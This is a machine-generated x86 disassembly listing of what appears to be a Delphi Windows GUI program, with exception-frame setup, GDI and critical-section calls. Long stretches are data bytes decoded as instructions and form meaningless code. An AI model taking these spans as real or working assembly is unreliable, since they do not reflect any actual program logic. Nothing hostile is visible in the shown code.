cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41a554
sub_41a654
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41a6f8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a6ff
retn
mov eax [ rw-data ]
call sub_413264
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41a420
xor edx edx
xor eax eax
call sub_416650
mov eax rw-data
call sub_40cdfc
call sub_405d7c
lea eax [ eax + 0xc ]
call sub_40cdfc
mov eax rw-data
call sub_40cdfc
mov eax rw-data
call sub_40564c
mov eax sub_41a48c
call sub_4054e8
mov eax rw-data
call sub_40cdfc
call sub_41924c
mov eax rw-data
call sub_40cdfc
mov eax rw-data
call sub_40564c
sub_41a704
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41a78d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a794
retn
call sub_419218
mov eax sub_41a48c
call sub_4054e0
mov dl 0x1
mov eax [ r-xdata ]
call sub_40cb3c
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_405664
mov dl 0x1
mov eax [ r-xdata ]
call sub_412b60
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413c88
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413c88
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41a798
inc esi
inc edi
add [ esi + 0x640000ff ] cl
inc esi
inc edi
add [ edi + 0x640000ff ] cl
inc esi
inc edi
add [ eax - 0x1 ] dh
add [ eax ] al
inc esi
inc edi
add [ ecx - 0x1 ] dh
add [ eax ] al
inc esi
inc edi
add [ edx - 0x1 ] dh
add [ eax ] al
inc esi
inc edi
add [ ebx - 0x1 ] dh
add [ eax ] al
inc esi
inc edi
add [ edi + edi * 8 ] dh
add [ esi + eax * 2 + 0x47 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
inc esi
inc edi
add [ esi - 0x1 ] dh
add [ eax ] al
inc esi
inc edi
add [ edi - 0x1 ] dh
add [ eax ] al
inc esi
inc edi
add [ eax - 0x1 ] bh
add [ eax ] al
inc esi
inc edi
add [ ecx - 0x1 ] bh
add [ eax ] al
inc esi
inc edi
add [ edx - 0x1 ] bh
add [ eax ] al
inc esi
inc edi
add [ ebx - 0x1 ] bh
add [ eax ] al
inc esi
inc edi
add [ edi + edi * 8 ] bh
add [ esi + eax * 2 + 0x47 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
inc esi
inc edi
add [ esi - 0x1 ] bh
add [ eax ] al
inc esi
inc edi
add [ edi - 0x1 ] bh
add [ eax ] al
inc esi
inc edi
add [ eax - 0x1 ] ah
add [ eax ] al
inc esi
inc edi
add [ ecx - 0x1 ] ah
add [ eax ] al
inc esi
inc edi
add [ edx - 0x1 ] ah
add [ eax ] al
inc esi
inc edi
add [ ebx - 0x1 ] ah
add [ eax ] al
inc esi
inc edi
add [ edi + edi * 8 ] ah
add [ esi + eax * 2 + 0x47 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
inc esi
inc edi
add [ esi - 0x1 ] ah
add [ eax ] al
inc esi
inc edi
add [ edi - 0x1 ] ah
add [ eax ] al
inc esi
inc edi
add [ eax - 0x1 ] ch
add [ eax ] al
inc esi
inc edi
add [ ecx - 0x1 ] ch
add [ eax ] al
inc esi
inc edi
add [ edx - 0x1 ] ch
add [ eax ] al
inc esi
inc edi
add [ ebx - 0x1 ] ch
add [ eax ] al
inc esi
inc edi
add [ edi + edi * 8 ] ch
add [ esi + eax * 2 + 0x47 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
inc esi
inc edi
add [ esi - 0x1 ] ch
add [ eax ] al
inc esi
inc edi
add [ edi - 0x1 ] ch
add [ eax ] al
inc esi
inc edi
add [ eax - 0x1 ] dl
add [ eax ] al
inc esi
inc edi
add [ ecx - 0x1 ] dl
add [ eax ] al
inc esi
inc edi
add [ edx - 0x1 ] dl
add [ eax ] al
inc esi
inc edi
add [ ebx - 0x1 ] dl
add [ eax ] al
inc esi
inc edi
add [ edi + edi * 8 ] dl
add [ esi + eax * 2 + 0x47 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
inc esi
inc edi
add [ esi - 0x1 ] dl
add [ eax ] al
inc esi
inc edi
add [ edi - 0x1 ] dl
add [ eax ] al
inc esi
inc edi
add [ eax - 0x1 ] bl
add [ eax ] al
inc esi
inc edi
add [ ecx - 0x1 ] bl
add [ eax ] al
inc esi
inc edi
add [ edx - 0x1 ] bl
add [ eax ] al
inc esi
inc edi
add [ ebx - 0x1 ] bl
add [ eax ] al
inc esi
inc edi
add [ edi + edi * 8 ] bl
add [ esi + eax * 2 + 0x47 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
inc esi
inc edi
add [ esi - 0x1 ] bl
add [ eax ] al
inc esi
inc edi
add [ edi - 0x1 ] bl
add [ eax ] al
inc esi
inc edi
add [ eax - 0x1 ] al
add [ eax ] al
inc esi
inc edi
add [ ecx - 0x1 ] al
add [ eax ] al
inc esi
inc edi
add [ edx - 0x1 ] al
add [ eax ] al
inc esi
inc edi
add [ ebx - 0x1 ] al
add [ eax ] al
inc esi
inc edi
add [ edi + edi * 8 ] al
add [ esi + eax * 2 + 0x47 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
inc esi
inc edi
add [ esi - 0x1 ] al
add [ eax ] al
inc esi
inc edi
add [ edi - 0x1 ] al
add [ eax ] al
inc esi
inc edi
add [ eax - 0x1 ] cl
add [ eax ] al
inc esi
inc edi
add [ ecx - 0x1 ] cl
add [ eax ] al
inc esi
inc edi
add [ edx - 0x1 ] cl
add [ eax ] al
inc esi
inc edi
add [ ebx - 0x1 ] cl
add [ eax ] al
inc esi
inc edi
add [ edi + edi * 8 ] cl
add [ esi + eax * 2 + 0x47 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
inc esi
inc edi
add [ esi - 0x1 ] cl
add [ eax ] al
inc esi
inc edi
add [ edi - 0x1 ] cl
add [ eax ] al
inc esi
inc edi
add [ eax ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
inc esi
inc edi
add [ 0x640000ff ] dh
inc esi
inc edi
add [ esi ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
inc esi
inc edi
add [ 0x640000ff ] bh
inc esi
inc edi
add [ esi ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edx ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
inc esi
inc edi
add [ 0x550000ff ] ah
mov ebp esp
xor eax eax
push ebp
push sub_41aa7d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aa84
retn
sub_41aa90
xchg esp eax
stosb [ edi ]
inc ecx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
hlt
sub_41aaac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_41af7b
mov [ ecx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
add eax 0x6f6c6f43
jb r-xdata
popad
insd
insb
stosd [ edi ]
inc ecx
add [ eax ] ah
0x41
adc [ eax ] al
or cl cl
inc ecx
add [ eax ] dl
leave
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
imul esp [ gs : edi + 0x68 ] 0x41abb074
add [ eax ] bh
leave
inc ecx
add [ eax - 0x37 ] dl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
sub_41b08c
add al 0x54
push eax
outsb
lea eax [ eax ]
cwde
mov al 0x41
add [ edi ] al
add al 0x54
push eax
outsb
xor [ eax - 0x51abffbf ] 0x41
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
cmp ch cl
inc ecx
add [ eax - 0x33 ] al
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0xb180c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41b1 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 4 + 0x180041 ] cl
add [ eax ] al
in al 0xad
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
lodsb [ esi ]
int 0x41
add [ ecx + eax * 2 ] dl
inc ecx
add [ ecx + eax * 2 ] bl
inc ecx
add ah dl
int 0x41
add [ esi ] al
push esp
inc edx
jb r-xdata
imul esp [ ebx + 0x73 ] 0xaa900004
inc ecx
add [ esp + ecx * 8 ] cl
inc ecx
add [ esp + ecx * 8 ] dl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
jae r-xdata
adc al 0x41
inc ecx
add [ ecx + eax * 2 ] bl
inc ecx
add ah ch
0x41
lodsb [ esi ]
inc ecx
add [ eax ] bl
add [ eax ] al
push esp
int3
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4e ] ch
inc ecx
add [ eax ] al
nop
cwde
mov cl 0x41
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
add al 0x24
retn
outsd
xor [ gs : edi + 0xc0041 ] ch
add bh bh
or al 0x0
mov dl 0x41
add [ edi ] al
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 + 0x41 ] bl
jae r-xdata
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
jl r-xdata
jae r-xdata
push 0x41b2
xor [ ecx - 0x51abffbf ] 0x41
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
jb r-xdata
mov al 0x41
add [ eax ] dl
add [ eax ] al
dec [ esi + edx * 8 + 0x10041 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add edx [ eax + 0x65 ]
outsb
mov eax eax
int3
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
mov dl 0x41
add [ eax + 0x4004118 ] dl
add [ eax ] cl
inc edi
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
outsb
je r-xdata
add [ edx ] 0x0
add al 0x46
jo r-xdata
add al 0xdc
jmp r-xdata
dec ebp
add [ eax ] bl
add [ eax ] al
sbb al 0x18
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
sub cl dl
inc ecx
add [ ecx + eax * 2 ] dl
pop esp
mov dl 0x41
imul esp [ ebx + 0x73 ] 0xaa900002
inc ecx
add [ edi + ecx * 8 ] cl
inc ecx
add [ edi + ecx * 8 ] dl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
imul esp [ ebx + 0x73 ] 0xb1940004
inc ecx
add [ eax + eax ] dl
add bh bh
cwde
salc
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
inc ecx
add [ ecx + eax * 2 ] bl
inc ecx
add [ eax ] dh
inc eax
inc ecx
add ah bl
fadd [ ecx ]
enter 0x41d8 0x0
cld
xlat
inc ecx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
inc eax
add [ eax ] ch
rol [ ecx ] 0x1
adc al 0x41
lodsd [ esi ]
inc ecx
add [ eax ] ch
rol [ ecx ] 0x1
xor al dl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
inc esp
mov dl 0x41
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
cmp al 0x10
inc eax
pop ebp
retn 0x4
sub_41b40e
inc ecx
add al bh
in al dx
inc ecx
add [ edi + ebp * 8 ] bh
inc ecx
add ah al
out dx eax
inc ecx
add [ eax - 0x67ffbfd6 ] bl
sub al [ eax ]
cwde
sub al [ eax ]
cwde
sub al [ eax ]
add [ eax ] eax
std
call [ eax + 0x80041ef ]
push esp
inc edi
jb r-xdata
jne r-xdata
jo r-xdata
inc ecx
add [ eax + 0x4119 ] dl
add [ eax ] cl
inc edi
jb r-xdata
inc ecx
add [ ebx - 0x72ffbe4c ] al
mov ah 0x41
add [ ebp - 0x4c ] ah
inc ecx
add [ ebp - 0x4c ] ch
inc ecx
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
imul esp [ ebx - 0x73 ] 0xb4440040
inc ecx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
ror [ edi + 0x60 ] 0xb2
fstp [ edx + 0x280041b4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x41b51cc0 ] cl
jo r-xdata
int 0xb8
jpe r-xdata
imul esp [ ebx - 0x38 ] 0x900041b3
sbb [ ecx ] eax
add [ eax ] al
or [ edi + 0x72 ] al
popad
add [ esi + 0x41b4 ] ch
add [ eax ] al
add [ esi * 4 - 0x4aa3ffbf ] ch
inc ecx
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
sbb al 0xb5
inc ecx
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_41f844
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
mov ch 0x41
add [ ebp + esi * 4 + 0x41 ] cl
add [ eax + eax ] ch
add [ eax ] al
or al 0x19
inc ecx
add al bl
xor al 0x40
add ah dl
inc ecx
inc ecx
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
lodsb [ esi ]
cmc
inc ecx
add ah bl
cmc
inc ecx
add [ ebx + edi * 8 ] cl
inc ecx
add [ eax + edi * 8 + 0x41 ] dh
add [ edx + eax * 2 + 0x41 ] ah
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x180041ae ] al
add [ eax ] al
add [ edx ] al
add ch bh
inc ecx
add [ ebp + esi * 4 + 0x41 ] bl
sbb edx 0x0
aam 0x11
sub_41b542
cld
call eax
clc
inc ecx
add ah dh
clc
inc ecx
add [ eax ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x8d657275
inc eax
add [ ebp + esi * 4 + 0x41 ] bl
add [ edi ] al
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
sbb al 0xb5
inc ecx
add [ eax + 0x4119 ] dl
add [ eax ] cl
inc edi
jb r-xdata
insd
popad
lea eax [ bx + si ]
sub [ esi + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xb6
jo r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax + 0xc00402a ] bl
push esp
push ebx
push 0x64657261
dec ecx
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov bl bh
inc ecx
add ah al
sti
inc ecx
add [ esi ] cl
push esp
dec ebp
je r-xdata
inc ecx
add [ eax + eax ] ah
add [ eax ] al
jl r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 4 ] ch
imul esp [ ebx + 0x73 ] 0xc8900000
mov ch 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
mov ch 0x41
add [ eax ] cl
add [ eax ] al
add [ eax - 0x27ffbff0 ] ah
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ edx + eax * 2 + 0x41 ] ah
add [ eax ] dh
in eax dx
inc ecx
add ah dl
cld
inc ecx
add ah ch
in eax dx
inc ecx
add [ ebp + edi * 8 + 0x41 ] ah
add [ ebp + edi * 8 + 0x41 ] ch
add al dl
std
inc ecx
add [ eax ] bh
out dx eax
inc ecx
add [ esi + edi * 8 + 0x41 ] bl
add [ edi + edi * 8 ] bh
inc ecx
add al bl
add al [ edx ]
sbb al 0xf0
inc ecx
add ah al
add eax [ edx ]
enter 0x4203 0x0
and [ 0xfffffffffbc80042 ] al
inc ecx
add [ edi + ebp * 8 ] bh
inc ecx
add al bh
add [ edx ] eax
sar dh 0x41
add [ edx + eax + 0x7740042 ] bh
inc edx
add al bh
pop es
inc edx
add [ ecx ] cl
push esp
dec ebp
je r-xdata
imul bp [ ebp + 0x49 ] 0x616d
nop
mov [ esi + 0x41 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
mov dh 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
mov dh 0x41
add [ eax ] dh
add [ eax ] al
add [ ebx + esi * 4 + 0x41 ] bh
add al bl
xor al 0x40
add ah dl
inc ecx
inc ecx
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
adc ah bh
inc ecx
add [ ecx + eax * 2 ] dl
inc ecx
add [ eax + 0x400041ed ] ah
cld
inc ecx
add ah ch
xor al 0x40
add al ah
imul bp [ ebp - 0x75 ] 0xfcc0
mov dh 0x41
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
inc ecx
add al bl
xor al 0x40
add ah dl
inc ecx
inc ecx
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
hlt
or [ edx + eax * 2 ] cl
add [ esp + ecx + 0x42 ] ah
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
imul bp [ ebp - 0x78 ] 0x41b6
add [ eax - 0x4c ] al
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
lea eax [ bx + si ]
enter 0x41b7 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
mov eax 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ eax + 0x3c0041 ] bh
popad
jo r-xdata
add [ eax ] al
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 4 + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov eax 0x3c0041
imul esp [ ebx + 0x73 ] 0xb7680000
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 + 0x41 ] ch
add [ eax + eax ] dh
add [ ebp + esi * 4 + 0x41 ] bh
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
sub_41b7c5
push ss
inc edx
add [ ecx + eax * 2 ] dl
inc ecx
add [ eax + 0x300041ed ] ah
pop ss
inc edx
add [ edx + eax * 2 + 0x41 ] ah
add [ ecx + ebx ] al
inc edx
add [ ecx + ebx - 0x1213ffbe ] al
inc ecx
add [ eax ] bh
sbb al 0x42
add ah ch
sbb al 0x42
add [ ebx - 0x10c7ffbe ] ch
inc ecx
add [ eax - 0x2bffbde3 ] cl
and [ edx ] eax
shr [ ecx ] 0x1
inc edx
add [ edx + ebp - 0xfdfffbe ] ah
inc ecx
add al cl
sub eax [ edx ]
sbb al 0x2c
inc edx
add [ esi + edx - 0x10c3ffbe ] cl
inc ecx
add ah al
out dx eax
inc ecx
add [ eax + 0x20 ] dl
inc edx
add ah bl
inc edx
add ah cl
pop ds
inc edx
add ah ah
inc edx
add [ esp + ebx + 0x1cfc0042 ] bl
inc edx
add [ eax + 0x7004228 ] bl
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b84470
popad
nop
or al 0xb9
inc ecx
add [ eax ] al
jo r-xdata
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
test [ edi ] ch
inc edx
add [ edi + ebp + 0x540a0042 ] dh
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
inc ecx
add al bl
xor al 0x40
add ah dl
inc ecx
inc ecx
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
and [ eax ] dh
inc edx
add [ ecx + eax * 2 ] dl
inc ecx
add [ eax + 0x500041ed ] ah
xor [ edx ] al
inc edx
inc ecx
add [ eax ] dh
in eax dx
inc ecx
add [ eax - 0x13ffbdd0 ] dh
in eax dx
inc ecx
add al dh
xor [ edx ] al
sbb al 0x31
inc edx
add [ edi + ebp * 8 ] dh
inc ecx
add [ eax ] bh
out dx eax
inc ecx
add [ eax ] dh
xor [ edx ] eax
mov eax 0xb40041ef
xor eax [ edx ]
sbb al 0xf0
inc ecx
add ah cl
xor eax [ edx ]
shl [ ebx ] 0x1
inc edx
add [ eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 4 + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x47 ] dh
inc ecx
add [ eax + eax ] dh
add [ eax ] al
jl r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
mov al 0xb8
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 4 + 0x180041 ] dh
add [ eax ] al
jl r-xdata
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b7c870
add [ eax - 0x4c ] al
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
sub_41b952
inc ecx
add ah cl
das
inc edx
add [ edi + ebp * 8 ] bh
inc ecx
add ah al
out dx eax
inc ecx
add [ eax + 0x32 ] dh
inc edx
add al ch
xor eax [ edx ]
adc [ edx + eax * 2 ] dh
add [ esp + esi ] ah
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
jl r-xdata
add [ eax ] bh
out dx eax
inc ecx
add [ eax ] dh
xor [ edx ] eax
mov eax 0xb40041ef
xor eax [ edx ]
sbb al 0xf0
inc ecx
add ah cl
xor eax [ edx ]
shl [ ebx ] 0x1
inc edx
add [ eax ] dh
inc ecx
add [ edi ] al
add eax 0x6f634954
outsb
or al 0xb9
inc ecx
add [ eax - 0x4c ] al
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add [ edx + edi * 4 + 0x41 ] bl
add [ eax ] dl
push esp
push edx
jo r-xdata
movsd [ edi ] [ esi ]
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_403604
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b9ac
clc
mov ecx 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
mov ecx 0x240041
add [ eax ] al
mov al [ 0xffffffffd8004010 ]
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
pop esp
mov edx 0x54100041
push edx
jae r-xdata
movsd [ edi ] [ esi ]
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41ba20
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_41ba5c
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_41ba98
push ebp
mov ebp esp
add esp 0xfffffff8
